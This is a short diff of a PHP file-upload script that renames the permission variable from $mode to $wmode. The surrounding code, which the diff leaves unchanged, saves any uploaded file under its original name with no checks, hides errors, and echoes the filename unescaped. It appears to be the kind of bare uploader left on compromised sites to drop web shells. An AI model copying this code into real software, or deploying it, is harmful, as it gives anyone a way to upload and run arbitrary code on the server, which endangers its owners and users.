@@ -13,13 +13,13 @@ echo '<font color="black" size="4">';
 if(isset($_POST['Submit'])){
     $filedir = ""; 
     $maxfile = '2000000';
-    $mode = '0644';
+    $wmode = '0644';
     $userfile_name = $_FILES['image']['name'];
     $userfile_tmp = $_FILES['image']['tmp_name'];
     if(isset($_FILES['image']['name'])) {
         $qx = $filedir.$userfile_name;
         @move_uploaded_file($userfile_tmp, $qx);
-        @chmod ($qx, octdec($mode));
+        @chmod ($qx, octdec($wmode));
 echo" <a href=$userfile_name><center><b>Sucess Upload :D ==> $userfile_name</b></center></a>";
 }
 }
